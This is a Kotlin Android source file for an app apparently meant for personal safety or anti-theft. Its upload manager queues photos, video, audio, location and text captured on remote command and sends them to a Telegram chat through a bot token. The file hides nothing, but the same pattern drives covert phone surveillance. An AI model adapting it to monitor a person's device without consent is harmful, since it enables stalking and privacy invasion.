package com.save.me

import android.content.Context
import android.net.ConnectivityManager
import android.net.Network
import android.os.Build
import android.util.Log
import androidx.room.*
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import java.io.File
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.ConcurrentHashMap

@Entity(tableName = "pending_uploads")
data class PendingUpload(
    @PrimaryKey(autoGenerate = true) val id: Long = 0,
    val filePath: String,
    val chatId: String,
    val type: String, // "photo", "video", "audio", "location", "text"
    val actionTimestamp: Long = System.currentTimeMillis()
)

@Dao
interface PendingUploadDao {
    @Query("SELECT * FROM pending_uploads ORDER BY actionTimestamp ASC")
    suspend fun getAll(): List<PendingUpload>

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    suspend fun insert(upload: PendingUpload): Long

    @Delete
    suspend fun delete(upload: PendingUpload)

    @Query("DELETE FROM pending_uploads WHERE filePath = :filePath")
    suspend fun deleteByFilePath(filePath: String)
}

@Database(entities = [PendingUpload::class], version = 1)
abstract class UploadDatabase : RoomDatabase() {
    abstract fun pendingUploadDao(): PendingUploadDao

    companion object {
        @Volatile
        private var INSTANCE: UploadDatabase? = null
        fun getInstance(context: Context): UploadDatabase {
            return INSTANCE ?: synchronized(this) {
                INSTANCE ?: Room.databaseBuilder(
                    context.applicationContext,
                    UploadDatabase::class.java,
                    "upload_manager_db"
                ).build().also { INSTANCE = it }
            }
        }
    }
}

object UploadManager {
    private var initialized = false
    private lateinit var appContext: Context
    private lateinit var dao: PendingUploadDao
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    private const val FILE_RETENTION_DAYS = 3

    // --- NEW: Set to track in-progress uploads (thread-safe) ---
    private val inProgressUploads = ConcurrentHashMap.newKeySet<String>()

    private fun getBotToken(): String {
        val token = Preferences.getBotToken(appContext)
        return token ?: ""
    }

    private fun getDeviceNickname(): String {
        return Preferences.getNickname(appContext) ?: "Device"
    }

    fun init(context: Context) {
        if (initialized) return
        appContext = context.applicationContext
        dao = UploadDatabase.getInstance(appContext).pendingUploadDao()
        NotificationHelper.createChannel(appContext)
        setupNetworkCallback()
        scope.launch { uploadAllPending() }
        initialized = true
        Log.d("UploadManager", "Initialized UploadManager")
    }

    fun queueUpload(file: File, chatId: String, type: String, actionTimestamp: Long = System.currentTimeMillis()) {
        scope.launch {
            val uploads = dao.getAll()
            if (uploads.any { it.filePath == file.absolutePath }) {
                Log.d("UploadManager", "File already in pending uploads, skipping duplicate: ${file.absolutePath}")
                return@launch
            }
            val upload = PendingUpload(
                filePath = file.absolutePath,
                chatId = chatId,
                type = type,
                actionTimestamp = actionTimestamp
            )
            val id = dao.insert(upload)
            Log.d("UploadManager", "Queued upload: $upload (db id: $id)")
            sendTelegramMessage(chatId, "[${getDeviceNickname()}] Command received: $type. Processing...")
            uploadAllPending()
        }
    }

    suspend fun uploadAllPending() {
        performRetentionCleanup()
        val uploads = dao.getAll()
        Log.d("UploadManager", "Uploading all pending: ${uploads.size} pending uploads.")
        for (upload in uploads) {
            val file = File(upload.filePath)

            // --- NEW LOGIC: Prevent duplicate uploads ---
            if (!inProgressUploads.add(upload.filePath)) {
                Log.d("UploadManager", "Upload in progress for file: ${upload.filePath}, skipping.")
                continue
            }

            try {
                if (!file.exists() || file.length() == 0L) {
                    dao.delete(upload)
                    Log.d("UploadManager", "Skipped upload (file missing): $upload")
                    sendTelegramMessage(upload.chatId, "[${getDeviceNickname()}] Error: File missing for ${upload.type} at ${formatDateTime(upload.actionTimestamp)}")
                    continue
                }

                // --- Telegram File Size Limit Check ---
                val maxSizeBytes = when (upload.type) {
                    "photo" -> 10 * 1024 * 1024 // 10 MB
                    "video", "audio", "document", "text" -> 50 * 1024 * 1024 // 50 MB
                    else -> 50 * 1024 * 1024
                }
                if (file.length() > maxSizeBytes) {
                    sendTelegramMessage(upload.chatId, "[${getDeviceNickname()}] Error: File too large for Telegram (${file.length() / (1024 * 1024)} MB). Limit is ${maxSizeBytes / (1024 * 1024)} MB for ${upload.type}.")
                    dao.delete(upload)
                    Log.d("UploadManager", "File too large for Telegram. Skipping upload: $upload")
                    continue
                }
                Log.d("UploadManager", "Uploading file: ${file.absolutePath} for upload record $upload")
                val success: Boolean = try {
                    when (upload.type) {
                        "location" -> sendLocationToTelegram(file, upload.chatId, upload.actionTimestamp)
                        "photo", "video", "audio" -> uploadFileToTelegram(file, upload.chatId, upload.type, upload.actionTimestamp)
                        "text" -> uploadFileToTelegram(file, upload.chatId, "text", upload.actionTimestamp)
                        else -> uploadFileToTelegram(file, upload.chatId, "document", upload.actionTimestamp)
                    }
                } catch (e: Exception) {
                    Log.e("UploadManager", "Upload error: ${e.localizedMessage}", e)
                    sendTelegramMessage(upload.chatId, "[${getDeviceNickname()}] Error uploading ${upload.type}: ${e.localizedMessage} at ${formatDateTime(upload.actionTimestamp)}")
                    false
                }
                if (success) {
                    // --- FIX: Only delete file if it is generated by the app (in cacheDir) ---
                    if (shouldDeleteAfterUpload(appContext, file, upload.type)) {
                        if (file.exists()) {
                            file.delete()
                        }
                    }
                    dao.delete(upload)
                    Log.d("UploadManager", "Upload complete and deleted: $upload")
                    Log.d("UploadManager", "Triggering CommandManager to check for next eligible command after upload $upload")
                    CommandManager.triggerQueueProcess()
                } else {
                    Log.d("UploadManager", "Upload failed for: $upload")
                }
            } finally {
                // --- NEW: Always remove from in-progress after attempt ---
                inProgressUploads.remove(upload.filePath)
            }
        }
    }

    /** Only delete photos, videos, audios, location, or text files that are in the app's cache directory */
    private fun shouldDeleteAfterUpload(context: Context, file: File, type: String): Boolean {
        // Types that are recorded/generated by the app
        val generatedTypes = setOf("photo", "video", "audio", "location", "text")
        val cacheDir = context.cacheDir
        return generatedTypes.contains(type) && file.absolutePath.startsWith(cacheDir.absolutePath)
    }

    fun sendLocationToTelegram(file: File, chatId: String, actionTimestamp: Long): Boolean {
        val botToken = getBotToken()
        if (botToken.isBlank()) {
            sendTelegramMessage(chatId, "[${getDeviceNickname()}] Error: Bot token is missing! Cannot send location.")
            Log.d("UploadManager", "Missing bot token for sending location")
            return false
        }

        val text = try {
            file.readText().trim()
        } catch (e: Exception) {
            sendTelegramMessage(chatId, "[${getDeviceNickname()}] Error: Could not read location file.")
            Log.d("UploadManager", "Could not read location file: ${file.absolutePath}")
            return false
        }

        val locationRegex = Regex("""\{"lat":([-\d.]+),"lng":([-\d.]+),.*\}""")
        val match = locationRegex.find(text)
        return if (match != null && match.groupValues.size >= 3) {
            val lat = match.groupValues[1]
            val lng = match.groupValues[2]
            val link = "https://maps.google.com/?q=$lat,$lng"
            val dt = formatDateTime(actionTimestamp)
            sendTelegramMessage(chatId, "[${getDeviceNickname()}] 📍 Location: $link")
            sendTelegramMessage(chatId, "Time: $dt")
            Log.d("UploadManager", "Location sent to Telegram: $lat, $lng at $dt")
            true
        } else {
            sendTelegramMessage(chatId, "[${getDeviceNickname()}] Location unavailable or malformed. Data received: $text\nTime: ${formatDateTime(actionTimestamp)}")
            Log.d("UploadManager", "Location malformed or unavailable. Data: $text")
            false
        }
    }

    /**
     * Telegram Bot API file size limits (as of Sep 2025):
     * - photo: 10 MB
     * - video/audio/document/text: 50 MB
     */
    fun uploadFileToTelegram(file: File, chatId: String, type: String, actionTimestamp: Long): Boolean {
        val botToken = getBotToken()
        if (botToken.isBlank()) {
            sendTelegramMessage(chatId, "[${getDeviceNickname()}] Error: Bot token is missing! Cannot send $type.")
            Log.d("UploadManager", "Missing bot token for sending $type: $file")
            return false
        }

        val url = when (type) {
            "photo" -> "https://api.telegram.org/bot$botToken/sendPhoto"
            "video" -> "https://api.telegram.org/bot$botToken/sendVideo"
            "audio" -> "https://api.telegram.org/bot$botToken/sendAudio"
            else -> "https://api.telegram.org/bot$botToken/sendDocument"
        }

        val fileField = when (type) {
            "photo" -> "photo"
            "video" -> "video"
            "audio" -> "audio"
            else -> "document"
        }

        val mediaType = when (type) {
            "photo" -> "image/jpeg"
            "video" -> "video/mp4"
            "audio" -> "audio/mp4"
            else -> "application/octet-stream"
        }

        // --- Telegram File Size Limit Check ---
        val maxSizeBytes = when (type) {
            "photo" -> 10 * 1024 * 1024 // 10 MB
            "video" -> 50 * 1024 * 1024 // 50 MB
            "audio" -> 50 * 1024 * 1024 // 50 MB
            else -> 50 * 1024 * 1024 // document/text: 50 MB
        }
        if (file.length() > maxSizeBytes) {
            sendTelegramMessage(chatId, "[${getDeviceNickname()}] Error: File too large for Telegram (${file.length() / (1024 * 1024)} MB). Limit is ${maxSizeBytes / (1024 * 1024)} MB for $type.")
            Log.d("UploadManager", "File too large for Telegram. Skipping upload: $file")
            return false
        }

        val client = OkHttpClient()
        val requestBodyBuilder = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", chatId)
            .addFormDataPart(fileField, file.name, file.asRequestBody(mediaType.toMediaTypeOrNull()))

        val requestBody = requestBodyBuilder.build()
        val request = Request.Builder().url(url).post(requestBody).build()

        try {
            client.newCall(request).execute().use { response ->
                Log.d("UploadManager", "Telegram upload response code: ${response.code}")
                if (!response.isSuccessful) {
                    val errorBody = response.body?.string()
                    sendTelegramMessage(chatId, "[${getDeviceNickname()}] Error uploading $type: ${response.code} $errorBody at ${formatDateTime(actionTimestamp)}")
                    Log.d("UploadManager", "Upload failed: $errorBody")
                    return false
                }
                sendTelegramMessage(chatId, "[${getDeviceNickname()}] ${type.replaceFirstChar { it.uppercase() }} captured at ${formatDateTime(actionTimestamp)}")
                Log.d("UploadManager", "$type sent successfully to Telegram for $chatId (${file.absolutePath})")
                return true
            }
        } catch (e: IOException) {
            sendTelegramMessage(chatId, "[${getDeviceNickname()}] Error uploading $type: ${e.localizedMessage} at ${formatDateTime(actionTimestamp)}")
            Log.e("UploadManager", "IOException while uploading file: ${e.localizedMessage}", e)
            return false
        }
    }

    fun sendTelegramMessage(chatId: String, message: String) {
        val botToken = getBotToken()
        if (botToken.isBlank()) {
            Log.d("UploadManager", "Bot token is blank, not sending message to Telegram.")
            return
        }
        val url = "https://api.telegram.org/bot$botToken/sendMessage"
        val client = OkHttpClient()
        val body = FormBody.Builder()
            .add("chat_id", chatId)
            .add("text", message)
            .build()
        val request = Request.Builder().url(url).post(body).build()
        Log.d("UploadManager", "sendTelegramMessage(chatId=$chatId, length=${message.length}): ${message.take(128)}${if (message.length > 128) "..." else ""}")
        try {
            client.newCall(request).execute().use { response ->
                Log.d("UploadManager", "Telegram sendMessage response code: ${response.code}")
                if (!response.isSuccessful) {
                    val errorBody = response.body?.string()
                    Log.e("UploadManager", "Error sending message to Telegram: ${response.code} $errorBody")
                }
            }
        } catch (e: Exception) {
            Log.e("UploadManager", "Exception sending message to Telegram: ${e.localizedMessage}", e)
        }
    }

    fun sendTelegramMessageWithInlineKeyboard(chatId: String, message: String, keyboardJson: String) {
        val botToken = getBotToken()
        if (botToken.isBlank()) {
            Log.d("UploadManager", "Bot token is blank, not sending inline keyboard message to Telegram.")
            return
        }
        val url = "https://api.telegram.org/bot$botToken/sendMessage"
        val client = OkHttpClient()
        val body = FormBody.Builder()
            .add("chat_id", chatId)
            .add("text", message)
            .add("reply_markup", keyboardJson)
            .build()
        val request = Request.Builder().url(url).post(body).build()
        Log.d("UploadManager", "sendTelegramMessageWithInlineKeyboard(chatId=$chatId): $message")
        try {
            client.newCall(request).execute().use { response ->
                Log.d("UploadManager", "Telegram inline keyboard response code: ${response.code}")
                if (!response.isSuccessful) {
                    val errorBody = response.body?.string()
                    Log.e("UploadManager", "Error sending inline keyboard to Telegram: ${response.code} $errorBody")
                }
            }
        } catch (e: Exception) {
            Log.e("UploadManager", "Exception sending inline keyboard to Telegram: ${e.localizedMessage}", e)
        }
    }

    private fun performRetentionCleanup() {
        val retentionMillis = FILE_RETENTION_DAYS * 24 * 60 * 60 * 1000L
        val now = System.currentTimeMillis()
        val files = appContext.getExternalFilesDir(null)?.listFiles() ?: return
        for (file in files) {
            if (now - file.lastModified() > retentionMillis) {
                val deleted = file.delete()
                Log.d("UploadManager", "Retention cleanup: deleted=${deleted} file=${file.absolutePath}")
            }
        }
    }

    private fun setupNetworkCallback() {
        val cm = appContext.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            cm.registerDefaultNetworkCallback(object : ConnectivityManager.NetworkCallback() {
                override fun onAvailable(network: Network) {
                    Log.d("UploadManager", "Network available, triggering uploadAllPending()")
                    scope.launch { uploadAllPending() }
                }
            })
        }
    }
}